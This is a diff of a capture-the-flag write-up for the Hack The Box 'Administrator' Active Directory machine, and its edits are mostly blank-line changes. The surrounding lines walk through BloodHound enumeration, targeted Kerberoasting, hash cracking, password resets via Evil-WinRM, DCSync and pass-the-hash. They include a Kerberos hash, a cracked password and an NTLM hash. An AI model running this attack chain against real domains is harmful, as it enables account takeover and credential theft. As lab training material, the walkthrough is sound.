@@ -79,6 +79,7 @@ After reviewing the Nmap scan results, we can confidently deduce that the target
 
 ### FTP
 Another interesting port is 21/tcp (FTP). However, attempts to log in using Olivia's account were unsuccessful.
+
 ```shell
 ┌──(frodo㉿kali)-[~/hack-the-box/administrator]
 └─$ ftp olivia@10.129.106.223
@@ -153,7 +154,6 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: dc.administrator.htb
 INFO: Done in 00M 17S
 INFO: Compressing output into 20241110005207_bloodhound.zip
-
 ```
 #### Bloodhound Analysis
 1. From the BloodHound graph, we can see that Olivia has the ability to perform `PSRemote` into the target. Additionally, under **First Degree Object Control**, Olivia has **GenericAll** privileges over Michael.
@@ -167,7 +167,6 @@ INFO: Compressing output into 20241110005207_bloodhound.zip
 
 > The **DCSync** attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the **Directory Replication Service Remote Protocol (MS-DRSR)**. Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
 {: .prompt-info}
-
 
 ## Foothold
 ## Targetted Kerberoasting
@@ -217,6 +216,7 @@ After syncing the time, I was able to successfully retrieve the Kerberos hash fo
 ```
 ## Password Cracking - 1
 I attempted to crack the Kerberos hash using `hashcat` with the rockyou dictionary, but unfortunately, it wasn't successful.
+
 ```shell
 ┌──(frodo㉿kali)-[~/hack-the-box/administrator]
 └─$ hashcat -a 0 -o cracked michael_hash /usr/share/wordlists/rockyou.txt 
@@ -304,7 +304,6 @@ Hardware.Mon.#1..: Util: 83%
 Started: Tue Nov 12 05:48:36 2024
 Stopped: Tue Nov 12 05:49:28 2024
 ```
-
 ## Lateral Movement & Privilege Escalation
 Since Olivia’s account has **GenericAll** privileges over Michael’s account, she can reset his password and then use it to initiate a WinRM session under his credentials.
 ```shell
@@ -323,7 +322,6 @@ Info: Establishing connection to remote endpoint
 System.Security.SecureString
 *Evil-WinRM* PS C:\Users\olivia\Documents> Set-ADAccountPassword -Identity michael -NewPassword $password
 *Evil-WinRM* PS C:\Users\olivia\Documents> 
-
 ```
 Looking at the BloodHound graph, we see that Michael has the **ForceChangePassword** permission for **Benjamin's** account. Using the same method as before, I reset Benjamin's password.
 
@@ -499,12 +497,11 @@ I was able to get the hash for ethan's account using **targeted kerberoasting at
 [*] Starting kerberoast attacks
 [*] Attacking user (ethan)
 [+] Writing hash to file for (ethan)
-                                                                                                                                       
+
 ┌──(frodo㉿kali)-[~/hack-the-box/administrator]
 └─$ cat ethan_hash        
 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$6069f5604ca98b28452515c62f0f5f33$df0b8f90c420cf01cd8308e03ebba6e3dbd3935084f015f5ca487d3fe0f1a042bbee88935e22d24721f09da981c523a121c1ddfdb898cfc022e253765e631de36509b1b5a482f34e9a7d9c52f5fd22bcd1072619d2bead020f241b01450724349b43fc6129e1b47f311fc4acf612cbaa3018fc3f532972fe70003ba9e0a4033485b3e1a50d0bedc34c8d3929c7c7a300175e1d0a27d40429998a735dca4a696a797c2a580da8dd9d17930b8eb4cec611a6c2ceb479f206834ee132c89a5dd312d4e9570312597831191313af83262b0298d6ebd03c68e289e47b55ea2f31dd23cb974531ef11dba38ad70f0f2cd36800ae96da442f55ad143a58f395505c6c620b34b8ebea73a98b63996b17ab140495edb67d6987ac085008a35bc15c018f6a025f0cd20d76ab56df4b758f5fce0977f714853126391ec9bd775abdcc8d2cbc473d98c846aee70cc7fa71f8e7feb983c724ae1414bcae62c23ac6f330d3a03fa533efc9e9b3a67909272c5f6bdda0855aba5976581f4ddfdbfa50882cd04519156679d66d70346a9f975e7a91f072a50d117ffa322ac73c4dbfb1c6d8a1dccce2509a5efcc0c4fd2cc7c1701c4dab4d92f404b93542b929b8288a4fb461266aaa0bde66b79cf69bfdb8585086faf2992110c5f720285a42c2b5ee7b0bf742562e6a50662180c0671b970e7b575c89bc7322bbd714f1076e6eab0703ddf3818b2a1fd61a2d1462b494ed2757243d3f52665f30af5a046df744832ca39ac89e2e13794918b0b324b3181daea14b243928b69a9cdb1515045240097654db77def69ecfdd9d2c1434024923edb11521bbfa8f8302bdcbb181bf2ae321dc312e7c694d7f5bdd87f54161b42b2a81de6cfbfdd57a3318017a7c979e3b33e967d5d550c8fb7b63b2a8a66deb79a74c815a29cf46f217b14a6fdfe5fde9b94759418e00ba040557802d35a7419899a53ebb44e0e4e7b9228c3e413ce30ca04dbdf82bfb1ad32d45718b65e82634a2c88cddff12f6dafb03896ace6dad0ec621bd72475457eae6b1db903529f2de0e73930a62b516ff3f9dc8a4fce07f8307c42e6afaed770dd2afe77cfc106384cb52ba484bbbb815daf3d6bbb0f8b0cb515aca01c96cba55345a247cc5f86ddd72d0189201b71a7a0305a961f34c396b1a9242a52caec3919d58578ec111ad253d3b965de7c44645cdcade0ab5688290efa417d6583bccbd276a67fa4bad11b8405bfdc3129fcc75c20d73d756ee68fa3f4e742bf9f823f7fb07372dcf74380b39336b95b2ced6b6bea5eea5f2a05405292ba54514fca13b7c51523785d77465ab9ce2e28b410cce7f04749c84fb0b6aefe82ee2367145bb1936c6b2f6b4a6f66f6c98ef16a85867741dff9d7053f98daeb3a0bb2faac7729d6d88d1db3d2ba22c25323456795096675e6e4c0672717fbb51f5f2016fd8c17c84891758d6459dcf102d8b9305ef6adeceb0c3b7d662a871ba61165caaf060a12673feab77b31123a11b1863677c1475ced12494bef4c2bbba1d5841
 ```
-
 ## Password Cracking - 3
 Next, I used `hashcat` and the `rockyou` dictionary to crack Ethan's password.
 ```shell
@@ -570,8 +567,6 @@ Stopped: Tue Nov 12 06:36:18 2024
 
 The password for Ethan is `limpbizkit`. With this, I can now extract the complete `NTDS.dit` secrets using Impacket’s `secretsdump.py` script.
 
-
-
 >NTDS.DIT stands for New Technology Directory Services Directory Information Tree. It serves as the primary database file within Microsoft’s Active Directory Domain Services (AD DS). Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. It acts as the backbone of Active Directory, housing critical data such as user account details, passwords, group memberships, and other object attributes.
 {: .prompt-info}
 
@@ -634,7 +629,6 @@ Domain Admin account is **pwned**.
 SMB         10.129.106.223  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
 SMB         10.129.106.223  445    DC               [+] administrator.htb\administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
 ```
-
 > Root flag is located at`C:\Users\Administrator\Desktop\root.txt`
 {: .prompt-info}
 
